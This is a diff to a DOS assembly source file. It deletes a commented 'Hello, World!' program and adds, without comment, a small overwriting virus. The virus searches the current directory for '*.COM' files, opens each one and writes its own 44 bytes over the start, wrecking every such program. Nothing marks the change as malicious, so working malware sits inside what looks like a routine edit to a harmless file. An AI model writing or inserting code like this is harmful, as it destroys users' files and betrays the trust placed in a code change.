@@ -1,19 +1,35 @@
-.model small
-.stack 100h
-
-.data
-    message db "Hello, World!", 0Dh, 0Ah, '$'  ; '$' is the string terminator for DOS interrupts
-
+.model tiny
 .code
-main:
-    mov ax, @data        ; Load data segment
-    mov ds, ax           ; Set data segment
-    
-    lea dx, message      ; Load address of message into dx
-    mov ah, 09h          ; Function to print string
-    int 21h              ; Call DOS interrupt to print the message
-    
-    mov ah, 4Ch          ; Function to exit the program
-    int 21h              ; Call DOS interrupt to exit
-    
-end main
+
+FNAME EQU 9EH
+ORG 100H
+COM_FILE DB '*.COM', 0
+
+START:
+    mov ah, 4EH
+    mov dx, offset COM_FILE
+    int 21h
+
+SEARCH_LP:
+    jc DONE
+    mov ax, 3D01H
+    mov dx, FNAME
+    int 21h
+
+    xchg ax, bx
+    mov ah, 40H
+    mov cl, 44
+    mov dx, 100H
+    int 21h
+
+    mov ah, 3EH
+    int 21h
+
+    mov ah, 4FH
+    int 21h
+    jmp SEARCH_LP
+
+DONE:
+    ret
+
+END START
